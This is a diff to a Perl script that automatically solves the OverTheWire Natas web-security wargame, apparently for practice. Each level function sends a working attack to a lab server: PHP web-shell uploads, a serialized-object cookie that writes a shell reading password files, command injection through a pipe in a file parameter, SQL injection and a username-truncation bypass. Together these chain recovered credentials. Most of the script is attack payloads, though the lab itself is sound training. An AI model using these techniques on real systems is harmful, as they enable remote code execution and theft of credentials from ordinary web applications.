@@ -107,13 +107,30 @@ sub level11 {
     return $nextPass;
 }
 
-#TODO: upload file same as level13
 sub level12 {
     my $pass = shift @_;
     my $auth = "Basic " . encode_base64("natas12:" . $pass);
-    my $res = $ua->post("http://natas12.natas.labs.overthewire.org/index.php", "Authorization" => $auth, "Content-Type" => "multipart/form-data",  "Content-Length" => "466", "Content-Disposition" => "form-data; name=\"MAX_FILE_SIZE\"\n\n1000", "Content-Disposition" => "form-data; name=\"filename\"\n\nshell.php", "Content-Disposition" => "form-data; name=\"uploadedfile\"\n\n<?php\nsystem(\"cat /etc/natas_webpass/natas13\");");
-    print "\nLOL\n", $res->decoded_content, "\nLOL\n";
-    my ($nextPass) = ($res->content =~ m/[^"]([A-Za-z0-9]{32})/);
+    my $res = $ua->post("http://natas12.natas.labs.overthewire.org/", "Authorization" => $auth, "Content-Type" => "form-data",  Content => [
+        uploadedfile => ["./shell.php"],
+        filename => "lolcopter.php"
+    ]);
+
+    my ($uploadedFile) = ($res->decoded_content =~ m/href="(.*\.php)"/);
+    $res = $ua->get("http://natas12.natas.labs.overthewire.org/$uploadedFile", "Authorization" => $auth);
+    return $res->content;
+}
+
+sub level13 {
+    my $pass = shift @_;
+    my $auth = "Basic " . encode_base64("natas13:" . $pass);
+    my $res = $ua->post("http://natas13.natas.labs.overthewire.org/", "Authorization" => $auth, "Content-Type" => "form-data",  Content => [
+        uploadedfile => ["./img_shell.php"],
+        filename => "lolcopter.php"
+    ]);
+
+    my ($uploadedFile) = ($res->decoded_content =~ m/href="(.*\.php)"/);
+    $res = $ua->get("http://natas13.natas.labs.overthewire.org/$uploadedFile", "Authorization" => $auth);
+    my ($nextPass) = ($res->content =~ m/[^"]?([A-Za-z0-9]{32})/);
     return $nextPass;
 }
 
@@ -276,17 +293,70 @@ sub level25 {
 sub level26 {
     my $pass = shift @_;
     $ua->max_redirect(0);
-    my $auth = "Basic " . encode_base64("natas25:" . $pass);
-    my $res = $ua->get("http://natas25.natas.labs.overthewire.org/", "Authorization" => $auth);
+    my $auth = "Basic " . encode_base64("natas26:" . $pass);
+    my $res = $ua->get("http://natas26.natas.labs.overthewire.org/", "Authorization" => $auth, "Cookie" => "drawing=YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL3NoZWxsLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjI6IkhJIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NDk6Ijw/cGhwIHN5c3RlbSgiY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Iik7Pz4iO319");
+    $res = $ua->get("http://natas26.natas.labs.overthewire.org/img/shell.php", "Authorization" => $auth);
     return ($res->content =~ m/[^"]([A-Za-z0-9]{32})/)[0];
 }
 
-#my @exploits = (\&level0, \&level1, \&level2, \&level3, \&level4, \&level5, \&level6, \&level7, \&level8, \&level9, \&level10, \&level11, \&level12);
-#my $curLogin = 0;
-#my $curPass = "natas0";
-my @exploits = (\&level26);
-my $curLogin = 26;
-my $curPass = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T";
+sub level27 {
+    my $pass = shift @_;
+    $ua->max_redirect(0);
+    my $auth = "Basic " . encode_base64("natas27:" . $pass);
+    my @form = {"username" => "natas28" . " " x 57 . "f", "password" => ""};
+    my $res = $ua->post("http://natas27.natas.labs.overthewire.org/", \@form, "Authorization" => $auth);
+    @form = {"username" => "natas28", "password" => ""};
+    $res = $ua->post("http://natas27.natas.labs.overthewire.org/", \@form, "Authorization" => $auth);
+    return ($res->content =~ m/[^"]([A-Za-z0-9]{32})/)[0];
+}
+
+sub level28 {
+    my $pass = shift @_;
+    $ua->max_redirect(0);
+    my $auth = "Basic " . encode_base64("natas28:" . $pass);
+    my $res = $ua->post("http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe%2BJ3Y2%2BwVxqbZmTo9x7ejCIaVF1T3rVZFTrXVtnaO5kbr2J4VaNxJnOMUDcIVZyQNvHp1eqEDRRcvHTpbwA%2BhU5kdG9JAieVf9SdTS9%2BJ%2B6q9%2BhBU7GhRXPlvKlVEWRlHkE9LKr8sLXaGqnKlMVHJcA%3D%3D", "Authorization" => $auth);
+    return ($res->content =~ m/[^"]([A-Za-z0-9]{32})/)[0];
+}
+
+sub level29 {
+    my $pass = shift @_;
+    $ua->max_redirect(0);
+    my $auth = "Basic " . encode_base64("natas29:" . $pass);
+    my $res = $ua->get('http://natas29.natas.labs.overthewire.org/index.pl?file=|echo%20$(cat%20/etc/nata*/*30)+', "Authorization" => $auth);
+    return ($res->content =~ m/[^"]([A-Za-z0-9]{32})/)[0];
+}
+
+sub level30 {
+    my $pass = shift @_;
+    $ua->max_redirect(0);
+    my $auth = "Basic " . encode_base64("natas30:" . $pass);
+    my $res = $ua->post("http://natas30.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas31", ["username" => "natas31", "password" => '"lol" or 1', "password" => '3'], "Authorization" => $auth);
+    return ($res->content =~ m/natas31([A-Za-z0-9]{32})/)[0];
+}
+
+sub level31 {
+    my $pass = shift @_;
+    my $auth = "Basic " . encode_base64("natas31:" . $pass);
+    my $res = $ua->post("http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32", "Authorization" => $auth, "Content-Type" => "form-data",  Content => [
+        file => "ARGV",
+        file => ["./shell.php"]
+    ]);
+    return ($res->content =~ m/[^"]([A-Za-z0-9]{32})/)[0];
+}
+
+sub level32 {
+    my $pass = shift @_;
+    my $auth = "Basic " . encode_base64("natas32:" . $pass);
+    my $res = $ua->post("http://natas32.natas.labs.overthewire.org/index.pl?./getpassword |", "Authorization" => $auth, "Content-Type" => "form-data",  Content => [
+        file => "ARGV",
+        file => ["./shell.php"]
+    ]);
+    return ($res->content =~ m/[^"]([A-Za-z0-9]{32})/)[0];
+}
+
+my @exploits = (\&level0, \&level1, \&level2, \&level3, \&level4, \&level5, \&level6, \&level7, \&level8, \&level9, \&level10, \&level11, \&level12, \&level13, \&level14, \&level15, \&level16, \&level17, \&level18, \&level19, \&level20, \&level21, \&level22, \&level23, \&level24, \&level25, \&level26, \&level27, \&level28, \&level29, \&level30, \&level31, \&level32);
+my $curLogin = 0;
+my $curPass = "natas0";
 print "natas" . $curLogin . ":" . $curPass . "\n";
 for my $exploit (@exploits) {
     my $newPass = $exploit->($curPass);
